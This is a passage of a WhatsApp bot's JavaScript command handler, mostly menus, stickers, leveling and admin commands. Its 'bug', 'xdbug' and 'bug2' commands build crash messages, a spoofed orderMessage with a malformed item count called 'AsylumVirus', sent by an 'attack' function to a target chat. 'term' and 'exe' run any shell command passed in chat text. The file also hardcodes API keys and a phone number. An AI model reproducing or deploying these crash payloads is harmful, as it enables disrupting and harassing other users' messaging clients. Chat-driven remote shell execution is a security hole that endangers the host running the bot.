║│ *☛•${prefix}retro (Text)*
║│
║│ *☛•${prefix}watercolor*
║│
║│ *☛•${prefix}pubglogo (Text)*
║│
║│ *☛•${prefix}bf4 (Text)*
║│
║│ *☛•${prefix}cslogo (Text)*
║│
║│ *☛•${prefix}lithgtext (Text)*
║│
║│ *☛•${prefix}silktext (Text)*
║│
║│ *☛•${prefix}flametext (Text)*
║│
║│ *☛•${prefix}crosslogo (Text)*
║│
║│ *☛•${prefix}glowtext (Text)*
║│
║│ *☛•${prefix}triggered*
║│
║│ *☛•${prefix}wasted*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
╚══╡*_White ᴡᴀʟᴋᴇR_*╞══╝`
tiringa.sendMessage(from, nsfmre, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "🌃🌄🏖️", 'jpegThumbnail': fs.readFileSync('./black.webp')}}}})
break
case 'songmenu':
case 'smenu':
case 'musicmenu':
case 'soundmenu':
msmenu = `|||
╠═══════════════
╠════ 🏖 SOUND 🏖═
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│  *(mark an audio)*
║│ *☛•${prefix}squirrel*
║│
║│ *☛•${prefix}slow*
║│
║│ *☛•${prefix}gemuk*
║│
║│ *☛•${prefix}bass*
║│
║│ *☛•${prefix}EARRAPE*
║│
║│ *☛•${prefix}FAST*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
╚══╡*_White ᴡᴀʟᴋᴇR_*╞══╝`
tiringa.sendMessage(from, msmenu, text, { thumbnail: dnsnew, sendEphemeral: true,quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "🌃🌄🏖️", 'jpegThumbnail': fs.readFileSync('./black.webp')}}}})
break
//_TESTES
case 'mz24':
if (!isZ24) return reply('Exclusive command z24 ')
tiringa.sendMessage(from, mz(prefix), text, tescuk, cr)
break

case 'gc':
if (body.endsWith('open')){
  tiringa.groupSettingChange (from, GroupSettingChange.messageSend, true)
}
break
						             
case 'leaderboard':
					case 'lb':
						if (!isGroup) return reply(mess.only.group)
						_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
						mentioned_id = []
						let leaderboard = '-----[ LEADERBOARD ]----\n\n'
						try {
					     for (let i = 0; i < 3; i++) {
								if (i == 0) {
									leaderboard += `${i + 1}º 🥇 : @${_level[i].id.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ XP: ${_level[i].xp}\n│ ➣ Level: ${_level[i].level}\n│ ➣  \n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
								} else if (i == 1) {
									leaderboard += `${i + 1}º 🥈 : @${_level[i].id.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ XP: ${_level[i].xp}\n│ ➣ Level: ${_level[i].level}\n│ ➣  \n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
								} else if (i == 2) {
									leaderboard += `${i + 1}º 🥉 : @${_level[i].id.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ XP: ${_level[i].xp}\n│ ➣ Level: ${_level[i].level}\n│ ➣  \n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
								}
								mentioned_id.push(_level[i].jid)     
							}
							mentions(leaderboard, mentioned_id, true)
						} catch (err) {
							console.log(err)
							tiringa.sendMessage(from, `É necessário que no mínimo 3 pessoas tenham level...`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
						}
					break

case 'ts':
tiringa.sendMessage(from, bahasa(prefix, sender), text, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

//_TESTESS
case 'bugreport':
const bugr = body.slice(10)
 if (args.length > 300) return tiringa.sendMessage(from, 'Maximum 300 characters', msgType.text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
var nomor = mek.participant
teks1 = `[REPORT]\nIn: @${sender.split("@s.whatsapp.net")[0]}\nError or bug: ${bugr}`
var options = {
 text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
tiringa.sendMessage('919446088620@s.whatsapp.net', options, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
reply("Message sent to my owner; Spam = block + ban.")
break

case 'request':
const pesann = body.slice(8)
if (args.length > 300) return tiringa.sendMessage(from, 'Maximum 300 characters', msgType.text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
var nomor = mek.participant
const teks2 = `[REQUEST]\nDe: @${sender.split("@s.whatsapp.net")[0]}\nMensagem: ${pesann}`
var options = {
text: teks1,
contextInfo: {mentionedJid: [sender]},
}
tiringa.sendMessage('919446088620@s.whatsapp.net', options, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
reply("Message sent to my owner; Spam = block + ban.")
break

case 'simi':
if (args.length < 1) return reply(`Use ${prefix}simi text`)
try { 
anu = await fetchJson(`https://simsumi.herokuapp.com/api?text=${encodeURIComponent(body.slice(5))}`, {method: 'get'})
if (anu.error) return reply('I can’t read what doesn’t exist 🐤 (talk to me)')
tiringa.sendMessage(from, `${anu.success} 🐤`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
} catch {
reply(ptbr.erro)
}
break

case 'prem':
if (isPremium) return reply('You are a premium user!')
else {
reply('You are not a premium user...')
}
break

case 'weather':
case 'time':
anu = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=57fcd6384cff4e529b9ca76089f05992&url=https://pt.wttr.in/${args[0]}`)
tiringa.sendMessage(from, anu, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

case 'time':
const hott = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const hual = `Schedule: ${hott}`
reply(hual)
break

//_GIT DO BOT
case 'git':
mekFilter.addFilter(from)
tiringa.sendMessage(from, `https://github.com/Abin/WW-BOT` , text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

case 'macumba':
pedido = body.slice(8)
buf = fs.readFileSync(`./src/macu.mp4`)
tiringa.sendMessage(from, buf, video, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

case 'hi':
if (isBanned) return reply('You are banned')
break

case 'boc':
if (!isOwner) return reply(ptbr.ownerB())
const horatt = moment.tz('Asia/Kolkata').format('HH:mm')
const horaAtual = `${horatt}`
if (/*horaAtual == '08:42' && */ammOff == "off" && isGroup) {
const aMimirMp3 = fs.readFileSync('./src/acorda.mp3')
const aMimirSt = fs.readFileSync('./src/sonic.webp')
for (let _ of groupMembers) {
tiringa.sendMessage(_.jid, aMimirMp3, MessageType.audio, {mimetype: 'audio/mp4', ptt:true})
tiringa.sendMessage(_.jid, aMimirSt, sticker)
}
ammOff = "on"
} else if (/*horaAtual != '08:42' && */ammOff == "on") {
ammOff = "off"
}
break
		
//_ENVIA OS ARQUIVOS .JSON By: Resen 
case 'jsonfiles':
if (!isOwner) return reply(ptbr.ownerB())
const daftarfile = fs.readFileSync('./database/json/daftar.json')
tiringa.sendMessage(from, daftarfile, document, {mimetype: 'json', filename: 'daftar.json'})
break

case 'omais':				
membr = []
const mett = groupMembers
const msdd = groupMembers
const siapssa = mett[Math.floor(Math.random() * mett.length)]
const sipssd = pushname[Math.floor(Math.random() * msdd.length)]
bbebn = `O mais${body.slice(6)} é o(a): @${siapssa.jid.split('@')[0]}`
membr.push(siapssa.jid)
mentions(bbebn, membr, true)
break    

case 'addxp':
if (!isGroup) return reply(ptbr.group())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Foi adicionado ${args[1]} em xp para @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)
addLevelingXp(pru, Number(args[1]))                     
break

case 'timer':
if (args[1]=="segundo") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return reply("Choose between: \nsecond\nminute\nhour\n\nExample: =timer 30 second")}
setTimeout( () => {
reply("The time is over")
}, timer)
break

case 'addprem':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
prem.push(`${mentioned}`)
fs.writeFileSync('./datauser/premium.json', JSON.stringify(prem))
susp = `👑@${mentioned[0].split('@')[0]} has been successfully added to the list of premium users👑`
mentions(`${susp}`, mentioned, true)   
break

case 'dellprem':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
delp = prem.indexOf(oh)
prem.splice(`${mentioned}`)
fs.writeFileSync('./datauser/premium.json', JSON.stringify(prem))
susp = `✖@${mentioned[0].split('@')[0]} has been removed from the list of premium users✖`
mentions(`${susp}`, mentioned, true)   
break
case 'blackwalker':
 const d = fs.readFileSync('./black.m4a')   
  tiringa.sendMessage(from, d, MessageType.audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true})
        pabo =` ek jibone`
         tiringa.sendMessage(from, pabo, voice, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "ᴀʏsʜᴇʀɪ", 'jpegThumbnail': fs.readFileSync('./black.webp')}}}})      
 break      
case 'ban':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
susp = `🚫@${mentioned[0].split('@')[0]} has been banned and will no longer be able to use bot commands🚫`
mentions(`${susp}`, mentioned, true)   
break

case 'unban':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
susp = `❎@${mentioned[0].split('@')[0]} has been unbanned and can use the bot commands again❎`
mentions(`${susp}`, mentioned, true)   
break

case 'send':
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var pesan = pc.split("|")[1];
tiringa.sendMessage(nomor+'@s.whatsapp.net', pesan, text)
break

case 'ttp5':
msgFilter.isFiltered(from)
if (args.length < 1) return reply(`Use this way:\nCommand: ${prefix}ttp Toin cattle`)
attp2 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${encodeURIComponent(body.slice(5))}`)
tiringa.sendMessage(from, attp2, sticker, {sendEphemeral: true,quoted: mek})
break

case 'attp':
if (args.length < 1) return reply(`Use this way:\nCommand: ${prefix}attp Toin cattle`)
attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(body.slice(5))}`)
tiringa.sendMessage(from, attp2, sticker, {sendEphemeral: true,quoted: mek})
break
case 'xdbug':
					if (!isOwner) return reply("owner myiren only")
					if (args.length < 1) return reply('kkkkk?')
				 for (let i = 0; i < args[0]; i++) {
await tiringa.toggleDisappearingMessages(from, 0)
}
const sendFakeStatus = (from, teks, faketeks) => {
				tiringa.sendMessage(from, teks, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: dnsnew, surface: 200, message: `dragu-Bot`, orderTitle: `Dragu-Bot`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true }})
			}
fake = 'dragu4'
sendFakeStatus(from, 'Successfully Send Bug As Much '+args.join(' '), fake)
					break
case 'bug':
            if (!isOwner) return reply(dla.ownerb())
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
tiringa.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: dnsnew,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
tiringa.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
bug(targett)
await sleep(3000)
troli(targett)
await sleep(3000)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bug2':
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Amount?')
				 for (let i = 0; i < args[0]; i++) {
await tiringa.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Sukses Send Bug Sebanyak '+args.join(' '), fake)
					break
case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                
				reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loop`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${lolhumankey}&text=${ini_txt}`)
                    tiringa.sendMessage(from, ini_buffer, sticker, { sendEphemeral: true,quoted: mek })
                    break
                    
                    //tiringa.sendMessage(from, ini_buffer2, sticker, { sendEphemeral: true,quoted: mek })
                    case 'getpict':
					if (!isGroup) return reply(ptbr.group())
            mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await tiringa.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            tiringa.sendMessage(from, pict, image, {quoted: Lan})
            break
case 'term':
					if (!isOwner) return reply("owneronly")
					const cmd2 = body.slice(6)
					var itsme = `0@s.whatsapp.net`
					var split = `EXECUTOR`
					const term = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
					exec(cmd2, (err, stdout) => {
						if (err) return tiringa.sendMessage(from, `root@dragu:~ ${err}`, text, { quoted: Lan })
						if (stdout) {
							tiringa.sendMessage(from, stdout, text, term)
						}
					})
					break
case '=':
                
				if (args.length < 1) return reply(`[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				const Math_js = require('mathjs')
				mtk = body.slice(3)
				if (typeof Math_js.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Error!\n[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				} else {
					reply(`*${mtk}* = ${Math_js.evaluate(mtk)}`)
				}
				await limitAdd(sender)
				break
case 'tb':
                
				if (args.length < 1) return reply(`[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				const Math_jsu = require('mathjs')
				mtk = body.slice(3)
				if (typeof Math_jsu.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Error!\n[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				} else {
				let po = tiringa.prepareMessageFromContent(from, {
					"listMessage":{
                  "title": "*WHATSAPP-BOT*",
                  "description": "pilh on/off",
                  "buttonText": "COMMANDS",
                  "listType": "SINGLE_SELECT",
                  "sections": [
                     {
                        "rows": [
                           {
                              "title": "on",
                              "rowId": `on`
                           },
						   {
                              "title": "off",
                              "rowId": ` off`
                           },
                           {
                              "title": "set1",
                              "rowId": `set2`
                           }
                        ]
                     }]}}, {}) 
            tiringa.relayWAMessage(po, {waitForAck: true})
			}
				await limitAdd(sender)
				break
case 'c':
                
				if (args.length < 1) return reply(`[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				const Math1_js = require('mathjs')
				mtk = body.slice(3)
				if (typeof Math1_js.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Error!\n[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				} else {
				gcinjj = `${Math1_js.evaluate(mtk)}`
				attp2t = await getBuffer(`https://api.xteam.xyz/attp?file&text=${gcinjj}`)
tiringa.sendMessage(from, attp2t, sticker, {sendEphemeral: true,quoted: mek})
				}
				await limitAdd(sender)
				break
                    case 'calculator':
                const Math2_js = require('mathjs')
				if (args.length < 1) return reply(`Example : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				
				mtk = body.slice(3)
				if (typeof Math2_js.evaluate(mtk) !== "number") {
					reply(`"${mtk}", Error!\n[🗞️] Send orders *${prefix}calculator [ Number ]*\nExample : ${prefix}calculator 12*12\n*NOTE:*\n🗞️ For Multiplication Using *\n🗞️ For Additional Use +\n🗞️ For Reduction Use -\n🗞️ For Sharing Using /`)
				} else {
					reply(`*${mtk}* = ${Math2_js.evaluate(mtk)}`)
				}
				await limitAdd(sender)
				break

                     case 'oppoi':
tiringa.sendMessage(from, {
					"listMessage":{
                  "title": "*WHATSAPP-BOT*",
                  "description": "pilh open/close",
                  "buttonText": "COMMANDS",
                  "listType": "SINGLE_SELECT",
                  "sections": [
                     {
                        "rows": [
                           {
                              "title": "open",
                              "rowId": 'open'
                           },
						   {
                              "title": "close",
                              "rowId": 'close'
                           }
                        ]
                     }]},quoted: mek})
break
case 'getpic':
				case 'getpp':
					if (!isGroup) return reply(ptbr.group())
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await tiringa.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            tiringa.sendMessage(from, pict, image, {quoted: mek})
            break
                   case 'upss':
                    if (!isOwner) return reply('owner only')
if (!isQuotedSticker) return reply('Reply the sticker!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await tiringa.downloadMediaMessage(encmedia)
						tiringa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Successfully uploading stickers`)
                    break
case 'upssc':
                    
if (!isQuotedSticker) return reply('Reply the sticker!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await tiringa.downloadMediaMessage(encmedia)
						tiringa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Successfully uploading stickers`)
                    break
                    case 'text3ds':(body.slice(8))
                    reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loop`)
                    ini_txt3 = args.join(" ")
                    ini_buffer3 = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/text3ds?text=${ini_txt3}&apikey=ikygans`)
                    tiringa.sendMessage(from, ini_buffer3, sticker, { sendEphemeral: true,quoted: mek })
                    
                    break
                    case 'matrixs':
                    reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} loop`)
                    ini_txt4 = args.join(" ")
                    ini_buffer4 = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/matrixs?text=${ini_txt4}&apikey=ikygans`)
                    tiringa.sendMessage(from, ini_buffer4, sticker, { quoted: mek })
                    
                    break
                case 'semoji':
                case 'emoji':
				reply(ptbr.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} `)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolhumankey}`)
                    tiringa.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break

case 'donate':
if (isOwner) return reply('Hi Italu')
else {
reply('hanya pemilik yang dapat menggunakan perintah ini')
}
break 
case 'relax':
reply('							\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break 
//_LEVEL ATUAL
case 'level':
msgFilter.isFiltered(from)
if (!isGroup) return reply(ptbr.group())
if (!isLevelingOn) return reply(ptbr.levelnoton())
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
const userTime = getRegisterTime(sender) 
if (userLevel === undefined && userXp === undefined) return reply(ptbr.levelnol())
const requiredXp = 20 * Math.pow(userLevel, 2) + 150 * userLevel + 1000
shaa =
`╔════╡ *_ʟᴇᴠᴇl_* ╞════
║▪ɴᴀᴍᴇ : ${pushname}
║▪xp : ${userXp}/${requiredXp}
║▪ʟᴇᴠᴇl : ${userLevel}
║▪ᴍᴇᴅᴇl : ${patt}
╚════╡ *_sᴛaᴛᴜs_* ╞════  `   
tiringa.sendMessage(from, shaa, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek}) 
break
  
//_ENVIA O VCARD DO DONO
case 'criador':
case 'vcard':
case 'owner':
case 'italu':
case 'italo':
await tiringa.sendMessage(from, {displayname: "𔑪ᴅʀᴀͥɢᴏᷧɴͫ♾ʟͣ𝖔ᷩ𝖔ͥ𝖕ᷡ𓆨⁩⁩⁩⁩⁩", vcard: vcard}, contact, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "ayish aara athu dragon aano :v", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./black.webp')}}}}) 
break
                     
case 'ownergrup':
case 'ownergroup':
tiringa.updatePresence(from, Presence.composing) 
options = {
text: `Dono do grupo: @${from.split("-")[0]}`,
contextInfo: { mentionedJid: [from]}}
tiringa.sendMessage(from, options, text, { thumbnail: dnsnew, sendEphemeral: true,quoted: mek } )
break
		
//const gy =['0','5','10','15','20','25','30','35','40','45','50','55','60','65','70','75','80','85','90','95','100']

case 'testime':
setTimeout( () => {
tiringa.sendMessage(from, 'The time is over', text) 
}, 10000)
setTimeout( () => {
tiringa.sendMessage(from, '5 seconds left', text)
}, 5000)
setTimeout( () => {
tiringa.sendMessage(from, '10 seconds left', text)
}, 0)
break

case 'gimage':
case 'googleimage':
try {
if (!isNsfw) return reply(ptbr.nsfw())
if (args.length < 1) return reply('Type what you want to search')
reply(ptbr.wait())
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('An error has occurred')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: `Here is your research on: ${teks}`})
}
}
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'poocha':
msgFilter.isFiltered(from)
reply(ptbr.wait())
try {
axios.get(`https://nekos.life/api/v2/img/meow`).then((res)=>{
imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
tiringa.sendMessage(from, buf, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek,caption: "🐱"})
})})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'dog':
try {
msgFilter.isFiltered(from)
reply(ptbr.wait())
res = axios.get(`https://nekos.life/api/v2/img/woof`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'kill2':
if (!isOwner) return reply(ptbr.ownerB())
pm2 = `pm2 kill`
reply('A mimir...')
exec(pm2, (err, stdout) => {
if(err) return tiringa.sendMessage(from, "Erro", text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
if (stdout) {
tiringa.sendMessage(from, stdout, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
} 
})
break

case 'reiniciar':
if (!isOwner) return reply(ptbr.ownerB())
npm = `npm start`
reply('Reiniciando em alguns segundos...')       
exec(npm, (err, stdout) => {
if(err) return tiringa.sendMessage(from, "Erro", text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
if (stdout) {
tiringa.sendMessage(from, stdout, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
} 
})
break

case 'exe':
tiringa.updatePresence(from, Presence.composing) 
if (!isOwner) return reply(ptbr.ownerB())
const cmd = body.slice(4)
exec(cmd, (err, stdout) => {
if(err) return tiringa.sendMessage(from, "Comando inexistente", text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
if (stdout) {
tiringa.sendMessage(from, stdout, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}
})
break
 
//_CONTADOR DE LETRAS
case 'contar':
msgFilter.isFiltered(from)
if (args.length == 0) return reply( '0 characters, because obviously there is no text😀')
const count = body.slice(8).length
if (count === 1) {
reply(`The text has a ${count} character.`)
} else if (count > 1) {
reply(`The text is ${count} characters long.`)
}
break

case 'igstory': 
anu = await fetchJson(`https://api.zeks.xyz/api/igs?apikey=apivinz&username=${body.slice(9)}`, {method: 'get'})
